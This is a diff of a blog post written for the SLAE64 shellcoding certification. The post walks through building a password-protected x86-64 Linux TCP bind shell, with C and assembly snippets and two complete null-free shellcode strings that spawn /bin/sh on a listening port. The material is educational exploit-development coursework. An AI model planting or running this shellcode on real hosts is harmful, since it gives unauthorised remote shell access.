@@ -5,14 +5,12 @@ layout = "post"
 date = "2017-10-17T14:02:00"
 url = "/slae64-01-bind-shell/"
 categories = [ "SLAE64", "Assembler", "Shellcode" ]
-tags = [ "assembler", "shellcode" ]
+tags = [ "shellcode", "assembler", "linux", "x64" ]
 +++
 
-After completing the video lectures of the Security Tube Linux 64 bit Assembler Expert course (SLAE64), a series of assessments must be completed to gain certification. The first assignment is to create a shellcode string that will start a TCP Bind Shell. 
+After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. The first assignment is to create a shellcode string that will start a TCP Bind Shell. 
 
-A bind shell listens on a network port and waits for an incoming connection. When a connection is received, a new socket is created, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned.
-
-This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.
+A bind shell listens on a network port and waits for an incoming connection. When a connection is received, a new socket is created, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned. This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.
 
 As an extra twist, the assignment requires a little more security; a passphrase must be implemented in the bind shell code to prevent anyone who happens to stumble across the listening socket from simply dropping into the host shell.
 
@@ -121,7 +119,7 @@ do
 
 This code accepts the connection and retains the newly spawned socket that the remote user is connected to.
 
-We now send a message down the new socket to request the secret passphrase from the connecting user. Any received data is placed in the <tt>in</tt> array.
+We now send a message down the new socket to request the secret passphrase from the connecting user. Any received data is placed into the <tt>in</tt> array.
 
 {{< highlight c >}}
     // Request a passphrase
@@ -158,7 +156,7 @@ If we get a good passphrase, we can break out of the authentication loop.
 
 ### Spawning the new shell
 
-Once we have authenticated our incoming connection, so we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.
+Once we have authenticated our incoming connection, we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.
 
 {{< highlight c >}}
 // Kill the server socket
@@ -216,7 +214,7 @@ I found that having a decent sketch of the stack layout and offsets makes writin
 
 ### Setting up
 
-The first thing to do is set RBP to the base of the stack so that the offsets in the layout sketch are correct.
+The first thing to do is set the base pointer (<tt>RBP</tt>) to the base of the stack so that the offsets in the layout sketch are correct.
 
 Next we'll use the Jump, Call, Pop method to establish the location of the embedded strings. Through trial and error I found that register <tt>R15</tt> was not clobbered by any of the syscalls, so that serves as a placeholder for the string reference address. 
 
@@ -242,7 +240,7 @@ _strdata:
 
 ### Utility functions
 
-Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as a functions rather than repeat the code multiple times. The first, <tt>_exit</tt>, restores the stack pointer and stops the code cleanly. The second, <tt>_prompt</tt>, sends strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative offset with no troublesome zeros.
+Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as callable functions rather than repeat the code multiple times. The first, <tt>_exit</tt>, restores the stack pointer and stops the code cleanly. The second, <tt>_prompt</tt>, sends strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative jump and no problematic zeros in the offset value.
 
 {{< highlight asm >}}
 _exit:                  ; exit nicely
@@ -256,12 +254,10 @@ _exit:                  ; exit nicely
 
 _prompt:                ; send string to a socket, RSI and RDX populated before call    
     mov rdi, [rbp-40]
-    xor rax, rax
-    push rax            ; push/pop has less instructions than mov for the lower registers
-    push rax    
-    pop rcx
-    pop r8
-    mov r9, r8          ; mov is more efficient for r8 - r15
+    xor rax, rax    
+    mov r10, rax        ; Zero unused params
+    mov r8, rax
+    mov r9, rax 
     add rax, 44         ; sys_sendto
     syscall
     ret
@@ -273,7 +269,7 @@ The first item in our variable stack is the 16 byte buffer containing the <tt>so
 
 ![image](img/sockaddr_in.png)
 
-There are quite a few zeros in there. However, we can clear RAX with the XOR trick. Pushing RAX gives us the <tt>sin_zero</tt> entry. Then we can populate the remaining values with add and shift operations.
+There are quite a few zeros in there. However, we can clear RAX with the XOR trick. Pushing RAX then gives us the <tt>sin_zero</tt> entry. The remaining values can be populated with add and shift operations.
 
 {{< highlight asm >}}
 _main:
@@ -302,15 +298,15 @@ Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5 | Arg6
 ---------|:----:|:----:|:----:|:----:|:----:|:----:
 Register | RDI  | RSI  | RDX  | RCX  | R8   | R9   
 
-Return values are still found in RAX.
+Return values are still found in <tt>RAX</tt>.
 
-Unsurprisingly, Microsoft uses a different method. The various register schemes are listed on the [x86-64 Wiki Page](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions).
-
-As an extra twist to keep us on our toes, when performing AMD64 syscalls, the registers are slightly different. R10 is used in place of RCX.
+As an extra twist to keep us on our toes, when performing AMD64 syscalls, the registers are slightly different. R10 is used in place of RCX for argument 4.
 
 Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5 | Arg6 
 ---------|:----:|:----:|:----:|:----:|:----:|:----:
 Register | RDI  | RSI  | RDX  | R10  | R8   | R9 
+
+Unsurprisingly, Microsoft uses a different method. The various register schemes are listed on the [x86-64 Wiki Page](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions).
 
 Another difference from x86 assembler is that we no longer trigger interrupt 0x80 for syscalls. The selection method remains the same, with the syscall number being placed in <tt>RAX</tt>, but there is now a dedicated <tt>syscall</tt> instruction. 
 
@@ -379,7 +375,7 @@ ID / RAX | Name                | Arg1 / RDI      | Arg2 / RSI
     jle _exit
 {{</ highlight >}}
 
-### Accepting and validating incoming connections
+### Accepting connections
 
 The <tt>accept</tt> syscall matches the function in the C code:
 
@@ -411,6 +407,8 @@ As we may be returning here from further down the code, we cannot depend on the 
 
 The code blocks at this point, waiting for connections. The error check is carried out as normal, but if we do have a valid socket ID, it is pushed onto the stack for safe keeping.
 
+### Validating the user
+
 Assuming that we have a valid socket, we need to prompt the remote user for a password. In the C code, the <tt>send()</tt> function was used for this. However, I could not find a matching syscall in the kernel documentation. The nearest syscall was <tt>sys_sendto</tt> which required extra parameters:
 
  ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / R10 | Arg5 / R8 | Arg6 / R9 
@@ -439,7 +437,7 @@ As discussed earlier, we need to use this call in a few places during execution,
     call _prompt
 {{</ highlight >}}
 
-To get the input from the remote user in the C code, we used <tt>read()</tt>. I could not find a <tt>read</tt> syscall, but <tt>recvfrom</tt> seemed to have a similar setup to the <tt>sendto</tt> method:
+To get the input from the remote user in the C code, we used <tt>read()</tt>. Again, I could not find a matching <tt>read</tt> syscall, but <tt>recvfrom</tt> seemed to have a similar setup to the <tt>sendto</tt> method:
 
  ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / R10 | Arg5 / R8 | Arg6 / R9 
 :---------|:-----|:-----------|:-----------|:-----------|:-----------|:-----------|:---------
@@ -450,14 +448,13 @@ A quick test showed that the same pattern of zeroing out the later parameters co
 {{< highlight asm >}}
     mov rdi, [rbp-40]   ; socket id
     lea rsi, [rbp-16]   ; buffer address
-    xor rcx, rcx        ; Zero out registers
-    push rcx
-    push rcx
-    push rcx
+    xor rax, rax        ; Zero out registers
+    push rax
+    push rax
     pop rdx
-    pop rax
-    pop r8
-    mov r9, r8  
+    pop r10
+    mov r8, rax
+    mov r9, rax 
     add rdx, 8          ; buffer length
     add rax, 45         ; recvfrom
     syscall
@@ -588,9 +585,9 @@ _spawn:
     call _exit
 {{</ highlight >}}
 
-### Testing the code out
+## Testing the code out
 
-The complete final file is hosted at GitHub (shell_bind.nasm)[https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/bind_shell.nasm]
+The complete final file is hosted at GitHub [shell_bind.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/bind_shell.nasm)
 We can build this .nasm file with the following command line:
 
 {{< highlight text >}}
@@ -627,45 +624,48 @@ exit
 codehead@ubuntu:~$
 {{</ highlight >}}
 
-### Extracting the shellcode
+## Extracting the shellcode
 
-Using the excellent [Commandline Fu](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump) snippet highlighted by Vivek in the course materials, we can extract the shellcode from our binary
+When it came to extracting the shellcode from the binary, I ran into a problem. Vivek's recommendation of the <tt>objdump</tt> command line from [Commandline Fu](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump) didn't work properly for me. It took a while to track down the cause. The problem manifested itself as segmentation faults due to misaligned jumps. However, I finally realised that the problem was in the data strings within my code. The code is quite verbose and as a result it is well over the short jump limit of 127 bytes. This meant that the normal practise of locating the string data at the end was not an option. To get around this, I had to locate the string data in the early part of the listing. When <tt>objdump</tt> decodes the binary, it tries to interpret the unlabelled text data as code and this can result in some confusion over the boundaries between code blocks. As a result, some bytes are shown twice.
+
+![image](img/objdump_bug.png)
+
+These repeated bytes are included in the output generated by the command line extractor. As a result, the code contains unexpected padding and the absolute jump over the string data does not land in the correct location.
+
+To resolve this, I wrote a bash script to extract shellcode based on <tt>hexdump</tt>. This script is hosted on GitHub: [Shellcode_Extract.sh](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_extract.sh). The script uses <tt>objdump</tt> to determine the offset and length of the <tt>.text</tt> section within the file, then uses <tt>hexdump</tt> to extract and format the raw hex without trying to decode or interpret it, avoiding any confusion or duplicated bytes.
+
+Taking the time to select instructions carefully paid off, there are no troublesome NULL bytes in the resulting shellcode string.
 
 {{< highlight text >}}
-for i in $(objdump -d bind_shell | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
-{{</ highlight >}}
-
-The resulting shellcode string contains no troublesome NULL bytes.
-
-{{< highlight text >}}
-\x48\x89\xe5\xeb\x04\x41\x5f\xeb\x5b\xe8\xf7\xff\xff\xff\x53\x70\x65\x61\x6b\x20
+\x48\x89\xe5\xeb\x04\x41\x5f\xeb\x5c\xe8\xf7\xff\xff\xff\x53\x70\x65\x61\x6b\x20
 \x66\x72\x69\x65\x6e\x64\x20\x61\x6e\x64\x20\x65\x6e\x74\x65\x72\x3a\x20\x70\x61
-\x70\x61\x73\x73\x77\x6f\x72\x64\x57\x65\x6c\x63\x6f\x6d\x65\x0a\x57\x72\x57\x72
-\x6f\x6e\x67\x0a\x48\x31\x48\x31\xc0\x50\x5b\x48\x83\xc0\x3c\x48\x83\xc3\x01\x48
-\x89\xec\x0f\x05\x48\x8b\x7d\xd8\x48\x31\xc0\x50\x50\x59\x41\x58\x4d\x89\xc1\x48
-\x83\xc0\x2c\x0f\x05\xc3\x48\x31\xc0\x50\x66\x05\x11\x5c\x48\xc1\xe0\x10\x66\x83
-\xc0\x02\x50\x48\x31\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc6\x48\xff\xc0\x48\x89
-\xc7\x48\x83\xc0\x27\x0f\x05\x48\x83\xf8\xff\x7e\xa9\x50\x48\x31\xc0\x48\x83\xc0
-\x31\x48\x8b\x7d\xe8\x48\x8d\x75\xf0\x48\x31\xd2\x48\x83\xc2\x10\x52\x0f\x05\x48
-\x83\xf8\xff\x7e\x89\x48\x31\xc0\x48\x83\xc0\x02\x48\x89\xc6\x48\x83\xc0\x30\x0f
-\x05\x48\x83\xf8\xff\x0f\x8e\x6f\xff\xff\xff\x48\x31\xc0\x48\x83\xc0\x2b\x48\x8b
-\x7d\xe8\x48\x8d\x75\xf0\x48\x8d\x55\xe0\x0f\x05\x48\x83\xf8\xff\x0f\x8e\x50\xff
-\xff\xff\x50\x4c\x89\xfe\x48\x31\xd2\x48\x83\xc2\x18\xe8\x52\xff\xff\xff\x48\x8b
-\x7d\xd8\x48\x8d\x75\xf0\x48\x31\xc9\x51\x51\x51\x5a\x58\x41\x58\x4d\x89\xc1\x48
-\x83\xc2\x08\x48\x83\xc0\x2d\x0f\x05\x48\x8d\x75\xf0\x49\x8d\x7f\x18\x48\x31\xc9
-\x48\x83\xc1\x08\xa6\x75\x14\xe2\xfb\x49\x8d\x77\x20\x48\x31\xd2\x48\x83\xc2\x08
-\xe8\x0f\xff\xff\xff\xeb\x26\x49\x8d\x77\x28\x48\x31\xd2\x48\x83\xc2\x06\xe8\xfd
-\xfe\xff\xff\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x30\x5f\x48\x83\xc6\x02\x0f\x05
-\xe9\x66\xff\xff\xff\x48\x31\xc0\x48\x83\xc0\x21\x49\x89\xc0\x48\x8b\x7d\xd8\x48
-\x31\xf6\x0f\x05\x4c\x89\xc0\x48\xff\xc6\x0f\x05\x4c\x89\xc0\x48\xff\xc6\x0f\x05
-\x48\x31\xc0\x50\x5a\x48\xbb\x78\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48
-\x89\x5d\xf0\x48\x8d\x7d\xf0\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\xe8\x87
-\xfe\xff\xff
+\x73\x73\x77\x6f\x72\x64\x57\x65\x6c\x63\x6f\x6d\x65\x0a\x57\x72\x6f\x6e\x67\x0a
+\x48\x31\xc0\x50\x5b\x48\x83\xc0\x3c\x48\x83\xc3\x01\x48\x89\xec\x0f\x05\x48\x8b
+\x7d\xd8\x48\x31\xc0\x49\x89\xc2\x49\x89\xc0\x49\x89\xc1\x48\x83\xc0\x2c\x0f\x05
+\xc3\x48\x31\xc0\x50\x66\x05\x11\x5c\x48\xc1\xe0\x10\x66\x83\xc0\x02\x50\x48\x31
+\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc0\x27
+\x0f\x05\x48\x83\xf8\xff\x7e\xa8\x50\x48\x31\xc0\x48\x83\xc0\x31\x48\x8b\x7d\xe8
+\x48\x8d\x75\xf0\x48\x31\xd2\x48\x83\xc2\x10\x52\x0f\x05\x48\x83\xf8\xff\x7e\x88
+\x48\x31\xc0\x48\x83\xc0\x02\x48\x89\xc6\x48\x83\xc0\x30\x0f\x05\x48\x83\xf8\xff
+\x0f\x8e\x6e\xff\xff\xff\x48\x31\xc0\x48\x83\xc0\x2b\x48\x8b\x7d\xe8\x48\x8d\x75
+\xf0\x48\x8d\x55\xe0\x0f\x05\x48\x83\xf8\xff\x0f\x8e\x4f\xff\xff\xff\x50\x4c\x89
+\xfe\x48\x31\xd2\x48\x83\xc2\x18\xe8\x51\xff\xff\xff\x48\x8b\x7d\xd8\x48\x8d\x75
+\xf0\x48\x31\xc0\x50\x50\x5a\x41\x5a\x49\x89\xc0\x49\x89\xc1\x48\x83\xc2\x08\x48
+\x83\xc0\x2d\x0f\x05\x48\x8d\x75\xf0\x49\x8d\x7f\x18\x48\x31\xc9\x48\x83\xc1\x08
+\xa6\x75\x14\xe2\xfb\x49\x8d\x77\x20\x48\x31\xd2\x48\x83\xc2\x08\xe8\x0d\xff\xff
+\xff\xeb\x25\x49\x8d\x77\x28\x48\x31\xd2\x48\x83\xc2\x06\xe8\xfb\xfe\xff\xff\x48
+\x31\xc0\x50\x5e\x48\x83\xc0\x30\x5f\x48\x83\xc6\x02\x0f\x05\xe9\x66\xff\xff\xff
+\x48\x31\xc0\x48\x83\xc0\x21\x49\x89\xc0\x48\x8b\x7d\xd8\x48\x31\xf6\x0f\x05\x4c
+\x89\xc0\x48\xff\xc6\x0f\x05\x4c\x89\xc0\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x5a
+\x48\xbb\x78\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x89\x5d\xf0\x48\x8d
+\x7d\xf0\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\xe8\x86\xfe\xff\xff
 {{</ highlight >}}
 
-Running it in Vivek's shellcode stub sh
+Running the shellcode in Vivek's [shellcode stub](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_wrapper.c), we get the same output and functionality as the Nasm generated binary.
 
-However, at 443 bytes, it is a little on the large side. This is mainly due to the bells and whistles of prompts, error checking and clean exits. If we strip away all the fluff and just leave the core functionality, we can get the shellcode down to a more respectable 262 bytes.
+### Trimming things down
+
+At 438 bytes this code is a little on the large side. This is mainly due to the bells and whistles of prompts, error checking and clean exits. If we strip away all the messaging and error checking, leaving just the core functionality, we can get the shellcode down to a more respectable 263 bytes.
 
 {{< highlight text >}}
 \x48\x89\xe5\x48\x31\xc0\x50\x66\x05\x11\x5c\x48\xc1\xe0\x10\x66\x83\xc0\x02\x50
@@ -673,21 +673,26 @@ However, at 443 bytes, it is a little on the large side. This is mainly due to t
 \xc0\x27\x0f\x05\x50\x48\x31\xc0\x48\x83\xc0\x31\x48\x8b\x7d\xe8\x48\x8d\x75\xf0
 \x48\x31\xd2\x48\x83\xc2\x10\x52\x0f\x05\x48\x31\xc0\x48\x83\xc0\x02\x48\x89\xc6
 \x48\x83\xc0\x30\x0f\x05\x48\x31\xc0\x48\x83\xc0\x2b\x48\x8b\x7d\xe8\x48\x8d\x75
-\xf0\x48\x8d\x55\xe0\x0f\x05\x50\x48\x8b\x7d\xd8\x48\x8d\x75\xf0\x48\x31\xc9\x51
-\x51\x51\x5a\x58\x41\x58\x4d\x89\xc1\x48\x83\xc2\x08\x48\x83\xc0\x2d\x0f\x05\x48
-\x8b\x5d\xf0\x48\x31\xc9\x48\x81\xc1\x77\x6f\x72\x64\x48\xc1\xe1\x20\x48\x81\xc1
-\x70\x61\x73\x73\x48\x39\xcb\x75\x02\xeb\x12\x48\x31\xc0\x50\x5e\x48\x83\xc0\x30
-\x5f\x48\x83\xc6\x02\x0f\x05\xeb\x99\x48\x31\xc0\x48\x83\xc0\x21\x49\x89\xc0\x48
-\x8b\x7d\xd8\x48\x31\xf6\x0f\x05\x4c\x89\xc0\x48\xff\xc6\x0f\x05\x4c\x89\xc0\x48
-\xff\xc6\x0f\x05\x48\x31\xc0\x50\x5a\x48\xbb\x78\x2f\x62\x69\x6e\x2f\x73\x68\x48
-\xc1\xeb\x08\x48\x89\x5d\xf0\x48\x8d\x7d\xf0\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b
-\x0f\x05
+\xf0\x48\x8d\x55\xe0\x0f\x05\x50\x48\x8b\x7d\xd8\x48\x8d\x75\xf0\x48\x31\xc0\x50
+\x50\x5a\x41\x5a\x49\x89\xc0\x49\x89\xc1\x48\x83\xc2\x08\x48\x83\xc0\x2d\x0f\x05
+\x48\x8b\x5d\xf0\x48\x31\xc9\x48\x81\xc1\x77\x6f\x72\x64\x48\xc1\xe1\x20\x48\x81
+\xc1\x70\x61\x73\x73\x48\x39\xcb\x75\x02\xeb\x12\x48\x31\xc0\x50\x5e\x48\x83\xc0
+\x30\x5f\x48\x83\xc6\x02\x0f\x05\xeb\x98\x48\x31\xc0\x48\x83\xc0\x21\x49\x89\xc0
+\x48\x8b\x7d\xd8\x48\x31\xf6\x0f\x05\x4c\x89\xc0\x48\xff\xc6\x0f\x05\x4c\x89\xc0
+\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x5a\x48\xbb\x78\x2f\x62\x69\x6e\x2f\x73\x68
+\x48\xc1\xeb\x08\x48\x89\x5d\xf0\x48\x8d\x7d\xf0\x50\x57\x48\x89\xe6\x48\x83\xc0
+\x3b\x0f\x05
 {{</ highlight >}}
 
+The [lean version](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/bind_shell_lean.nasm) of the code also uses a  numeric match for the password check rather than a byte-by-byte comparison. This is less flexible, but makes for smaller code.  
 
+Running this code in the shellcode stub has the same bind shell functionality, but there are no prompts or warnings. A reasonable payload would be somewhere between the two depending on space constraints.
+
+This concludes the first assignment of the SLAE64 course assessments. If you've made it this far, I hope you gained as much from it as I did from writing it. Stay tuned for the next instalment!
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
 http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
 
 Student ID: SLAE64-1471
+
